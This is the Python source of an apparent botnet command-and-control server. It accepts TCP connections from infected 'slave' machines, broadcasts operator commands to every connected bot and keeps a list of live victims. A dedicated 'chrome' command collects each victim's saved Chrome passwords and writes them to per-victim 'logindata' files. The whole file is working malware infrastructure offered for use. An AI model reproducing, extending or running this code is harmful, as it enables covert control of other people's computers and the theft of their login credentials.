#!/usr/bin/python3

import socket
import sys
import os
import threading
import queue
import time
from colorama import Fore, Back, Style
from csv_handler import *
from colorama import init
init(autoreset=True)

q = queue.Queue()
Socketthread = []
ClientList = {}


lock = threading.Lock()

def lprint(*a, **b):
    with lock:
        print(*a, **b)



class BotHandler(threading.Thread):
	def __init__(self, client, client_address, qv):
		threading.Thread.__init__(self)
		self.client = client
		self.client_address = client_address
		self.ip = client_address[0]
		self.port = client_address[1]
		self.q = qv

	def run(self):
		BotName = threading.current_thread().getName()
		lprint(Fore.GREEN +"[*] Slave " + self.ip + ":" + str(self.port) + " connected with Thread-ID: ", BotName)
		add(self.ip,self.port)
		ClientList[BotName] = self.client_address
		
		while True:
			try :
				RecvBotCmd = self.q.get()
				self.client.send(RecvBotCmd.encode('utf-8','ignore'))
				#lprint("SENDING ",self.q.get())
				if(RecvBotCmd == "chrome"):
					recvVal = (self.client.recv(100000)).decode('utf-8','ignore')
					if( "Error Opening Database" in recvVal):
						print(Fore.RED + recvVal)
					elif( "Error Executing Query" in recvVal ):
						print(Fore.RED + recvVal)
					else:
						filename = "logindata"+str(ClientList[BotName])+".txt"
						with open(filename, 'w') as f:
							f.write(recvVal)
						lprint(Fore.GREEN + "Chrome Passwords should have been saved in", filename)

				elif(RecvBotCmd == ""):
					#lprint("PINGING")
					self.client.send("".encode('utf-8'))
				else:
					recvVal = (self.client.recv(1024)).decode('utf-8','ignore')
					lprint(recvVal)

			except Exception as ex:
				lprint(ex)
				lprint(Fore.RED + "[*] Slave " + self.ip + ":" + str(self.port) + " went offline!")
				break
		#curr_thread = threading.current_thread()
		#print(curr_thread.isAlive())
		remove(self.ip,str(self.port))

#-------------------------------------------------------------------------------------------

class Pinger(threading.Thread):
	def __init__(self, qv3):
		threading.Thread.__init__(self)
		self.q = qv3

	def run(self):
		global Socketthread
		while True:
			for i in range(len(Socketthread)):
				time.sleep(1)
				self.q.put("")
			
class BotCmd(threading.Thread):
	def __init__(self, qv2):
		threading.Thread.__init__(self)
		#self.daemon = True
		self.q = qv2

	def run(self):
		while True:
			try:
				global Socketthread
				SendCmd = str(input(">>"))
				Socketthread = [t for t in Socketthread if t.isAlive()]

				if (SendCmd == ""):
					pass
				elif (SendCmd == "exit") :
					for i in range(len(Socketthread)):
						time.sleep(0.1)
						self.q.put(SendCmd)
					time.sleep(5)
					os._exit(0)
				elif (SendCmd == "viewalive"):
					view()
				else:
					bots = len(Socketthread)
					if(bots > 0):
						lprint(Fore.YELLOW +"[+] Sending Command: " + SendCmd + " to " + str(bots) + " bots")
						#Socketthread = [t for t in Socketthread if t.is_alive()]
						for i in range(len(Socketthread)):
							time.sleep(0.1)
							self.q.put(SendCmd)
					else:
						lprint(Fore.RED + "[!] No Bots are currently online")

			except Exception as ex:
				lprint(ex)
				lprint("EXITING")
				time.sleep(2)
				clear()
				os._exit(0)


def listener(lhost, lport, q):
	server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
	server_address = (lhost, lport)
	server.bind(server_address)
	server.listen(10)

	print (Fore.YELLOW + "[+] Starting Botnet listener on tcp://" + lhost + ":" + str(lport) + "\n")
	BotCmdThread = BotCmd(q)
	BotCmdThread.start()
	pingThread = Pinger(q)
	pingThread.start()

	while True:
		(client, client_address) = server.accept()    #start listening
		newthread = BotHandler(client, client_address, q) #BotHandler = Multiconn
		Socketthread.append(newthread)
		newthread.start()

#-------------------------------------------------------------------------------------------
#import
def main():
	if (len(sys.argv) < 3):
		print ("[!] Usage:\n  [+] python3 " + sys.argv[0] + " <LHOST> <LPORT>\n  [+] Eg.: python3 " + sys.argv[0] + " 0.0.0.0 8080\n")
	else:
		try:
			lhost = sys.argv[1]
			lport = int(sys.argv[2])
			listener(lhost, lport, q)
			
		except Exception as ex:
			print("\n[-] Unable to run the handler. Reason: " + str(ex) + "\n")

if __name__ == '__main__':
	main()